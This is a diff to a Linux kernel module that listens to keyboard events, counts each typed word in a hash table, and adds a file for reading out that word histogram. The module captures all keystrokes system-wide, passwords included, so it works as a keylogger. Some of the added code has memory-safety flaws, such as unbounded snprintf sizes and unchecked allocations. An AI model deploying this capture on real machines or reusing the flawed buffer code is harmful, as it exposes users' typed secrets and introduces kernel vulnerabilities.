@@ -27,6 +27,8 @@
 static struct dentry *debugfs_dir = NULL;
 static char kbd_buffer[STR_MAX_LEN] = { 0 };
 static size_t kbd_buffer_pos = 0;
+static int device_open_count = 0;
+static char *histogram_string = NULL;
 
 /* LKM information */
 MODULE_LICENSE("GPL v2");
@@ -42,12 +44,17 @@ static ssize_t histogram_read(struct file *file,
 static int kbd_notifier_fn(struct notifier_block *nb,
         unsigned long action, void *data);
 
+static int histogram_open(struct inode *inode, struct file* file);
+static int histogram_release(struct inode *inode, struct file *file);
+
 /**
 ** \brief File operations
 */
 static struct file_operations file_ops = {
     .owner = THIS_MODULE,
-    .read = histogram_read
+    .read = histogram_read,
+    .open = histogram_open,
+    .release = histogram_release
 };
 
 /**
@@ -223,9 +230,9 @@ static void ht_free_bucket(struct hash_table_item *bucket)
 static void ht_free(struct hash_table *ht)
 {
     /* Loop through the hash table */
-    //size_t i = 0;
-    //for (; i < ht->buckets_nb; ++i)
-    //    ht_free_bucket(ht->buckets[i]);
+    size_t i = 0;
+    for (; i < ht->buckets_nb; ++i)
+        ht_free_bucket(ht->buckets[i]);
     /* Free table */
     kfree(ht->buckets);
     kfree(ht);
@@ -339,7 +346,12 @@ static void ht_dump(const struct hash_table *ht)
 static ssize_t histogram_read(struct file *file,
         char __user *buf, size_t len, loff_t *ppos)
 {
-    return 0;
+    /* Log */
+    pr_debug("histogram: read");
+
+    /* Simple read */
+    return simple_read_from_buffer(buf, len, ppos,
+            histogram_string, strlen(histogram_string));
 }
 
 /**
@@ -368,8 +380,6 @@ static int kbd_notifier_fn(struct notifier_block *nb,
     if (!kbd_param->down)
         return NOTIFY_DONE;
 
-    pr_info("histogram: ---------------------------");
-
     switch (action)
     {
     case KBD_KEYCODE:
@@ -389,14 +399,6 @@ static int kbd_notifier_fn(struct notifier_block *nb,
         return NOTIFY_DONE;
     }
     c = (char)kbd_param->value;
-    pr_info("histogram: action: %lu", action);
-    pr_info("histogram: down: %d", kbd_param->down);
-    pr_info("histogram: value: %u", kbd_param->value);
-    pr_info("histogram: char value: %c", c);
-    pr_info("histogram: shift: %d", kbd_param->shift);
-    pr_info("histogram: led state: %d", kbd_param->ledstate);
-    pr_info("histogram: ---------------------------");
-
 
     if (c == ASCII_DEL)
     {
@@ -413,13 +415,88 @@ static int kbd_notifier_fn(struct notifier_block *nb,
         kbd_buffer[kbd_buffer_pos] = 0;
         ht_incr(histogram, strdup(kbd_buffer));
         kbd_buffer_pos = 0;
-        ht_dump(histogram);
     }
     /* Kdb buffer length check */
     if (kbd_buffer_pos + 1 >= STR_MAX_LEN)
         kbd_buffer_pos = 0;
 
     return NOTIFY_OK;
+}
+
+static char *histogram_tostring(void)
+{
+    /* Variables */
+    size_t i = 0;
+    struct hash_table_item *item = NULL;
+    size_t space = (1 << 10);
+    char *buffer = kmalloc(space, GFP_KERNEL);
+    char *buffer_tmp = NULL;
+    size_t index = 0;
+
+    /* Loop through buckets */
+    for (; i < histogram->buckets_nb; ++i)
+    {
+        /* Empty bucket */
+        if (histogram->buckets[i] == NULL)
+            continue;
+
+        /* Loop through bucket */
+        item = histogram->buckets[i];
+        while (item != NULL)
+        {
+            /* Add to the buffer */
+            index += snprintf(buffer + index, STR_MAX_LEN,
+                    "%s: %d\n", item->key, item->value);
+            if (index + 16 + STR_MAX_LEN >=  space)
+            {
+                space *= 2;
+                buffer_tmp = kmalloc(space, GFP_KERNEL);
+                memcpy(buffer_tmp, buffer, index);
+                kfree(buffer);
+                buffer = buffer_tmp;
+            }
+
+            item = item->next;
+        }
+    }
+    return buffer;
+}
+
+/**
+** \brief
+*/
+static int histogram_open(struct inode *inode, struct file* file)
+{
+    /* Log */
+    pr_debug("histogram: open");
+
+    /* Check busy */
+    if (device_open_count)
+        return -EBUSY;
+    device_open_count++;
+    try_module_get(THIS_MODULE);
+
+    /* Build string */
+    histogram_string = histogram_tostring();
+
+    return 0;
+}
+
+/**
+** \brief
+*/
+static int histogram_release(struct inode *inode, struct file *file)
+{
+    /* Log */
+    pr_debug("histogram: close");
+
+    /* Free string */
+    kfree(histogram_string);
+
+    /* Uncheck busy */
+    device_open_count--;
+    module_put(THIS_MODULE);
+    return 0;
 }
 
 /**
